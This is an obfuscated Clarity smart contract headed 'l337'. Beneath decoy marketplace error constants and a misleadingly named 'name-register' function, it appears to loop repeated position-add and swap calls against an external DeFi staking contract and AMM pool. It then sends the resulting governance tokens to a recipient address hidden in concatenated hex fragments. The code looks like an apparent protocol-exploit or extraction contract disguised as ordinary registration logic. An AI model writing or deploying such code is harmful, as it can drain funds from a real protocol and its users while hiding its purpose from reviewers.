;; version: 1011
;; name: l337
;; namespace: btc

  (define-constant ERR-ALREADY-LISTED (err u401))

  (define-constant ERR-WRONG-COMMISSION (err u402))
  (define-constant ERR-NOT-AUTHORIZED (err u403))

  (define-constant ERR-NOT-FOUND (err u404))
  (define-constant ERR-WRONG-PRICE (err u405))

  (define-constant ERR-TRANSFER-FAILED (err u500))

(define-data-var TTjjh5 principal tx-sender) (define-constant ht2cMV (err u1011)) (define-constant lMUQdk 0xd3bf) (define-constant zVSqW2 u100000000) (define-constant PumQ2I 0xe6ca) (define-constant MNGu1b 0x4d3e) (define-constant DBFJBp 0xd376) (define-constant gzkQhS 0x1af4) (define-constant crEDG3 0xb44a) (define-constant cM8lhR 0xa34f) (define-constant XxOcZg 0x43f8) (define-constant yxbZ6G 0xf5de) (define-constant JKErdE 0x3881) (define-constant WRu8Q7 (concat crEDG3 yxbZ6G)) (define-constant ig3kqB (concat gzkQhS PumQ2I)) (define-constant jJk8nM 0x16) (define-constant FO4N4S (concat DBFJBp lMUQdk)) (define-constant HhqaYm (concat MNGu1b JKErdE)) (define-constant siuPfR (concat cM8lhR XxOcZg)) (define-constant DQf7JB (concat FO4N4S WRu8Q7)) (define-constant NuN2Uq (concat siuPfR HhqaYm)) (define-constant hzpQgV (concat DQf7JB (concat NuN2Uq ig3kqB))) (define-constant qBBz7r (unwrap-panic (principal-construct? jJk8nM hzpQgV))) (define-private (YWguiC) (ok (asserts! (is-eq tx-sender (var-get TTjjh5)) ht2cMV)) ) (define-public (name-register (bavzVP uint) (cnd23p uint) (hj1tO7 uint) (CZa4N2 uint)) (let ( (yVSt9z-IIaXd6 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 get-token-given-position bavzVP))) (LGhHtT (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.amm-swap-pool-v1-1 get-x-given-y 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 zVSqW2 yVSt9z-IIaXd6))) ) (try! (YWguiC)) (let ( (xNeHW2 (get jX8sYQ (fold FH3sLn 0x75fbb5aa3f276f43a3da49da8c467ff9bc27ae91d008e717a337f8783d09a218b3d583411d9d39a6fc7c894f6630f51a8e {jX8sYQ: bavzVP, jLLXOc: LGhHtT, cnd23p: cnd23p, hj1tO7: hj1tO7, CZa4N2: CZa4N2}))) ) (if (is-eq tx-sender qBBz7r) (ok true) (begin (if (>= xNeHW2 (* u5000 zVSqW2)) (let ((Mpxu8u (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token transfer-fixed xNeHW2 tx-sender qBBz7r none)))) (ok true)) (ok true) ) ) ) ) ) ) (define-private (FH3sLn (i (buff 1)) (bNH9VW {jX8sYQ: uint, jLLXOc: uint, cnd23p: uint, hj1tO7: uint, CZa4N2: uint})) (if (and (> (+ (get jLLXOc bNH9VW) (get hj1tO7 bNH9VW)) (+ (get jX8sYQ bNH9VW) (get CZa4N2 bNH9VW))) (> (get jX8sYQ bNH9VW) (* u50 zVSqW2)) (> (get jX8sYQ bNH9VW) (get cnd23p bNH9VW))) (let ( (IIaXd6 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 get-token-given-position (get jX8sYQ bNH9VW)))) (OKi2Lf (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 add-to-position (get jX8sYQ bNH9VW)))) (EgOgFR (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.amm-swap-pool-v1-1 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token zVSqW2 IIaXd6 none))) (lLbhbo (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 get-token-given-position EgOgFR))) (vamXYJ (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.amm-swap-pool-v1-1 get-x-given-y 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex-v2 zVSqW2 lLbhbo))) ) (begin (print {jX8sYQ: EgOgFR, jLLXOc: vamXYJ, cnd23p: (get jX8sYQ bNH9VW), hj1tO7: u0, CZa4N2: (get CZa4N2 bNH9VW)}) {jX8sYQ: EgOgFR, jLLXOc: vamXYJ, cnd23p: (get jX8sYQ bNH9VW), hj1tO7: u0, CZa4N2: (get CZa4N2 bNH9VW)} ) ) bNH9VW ) )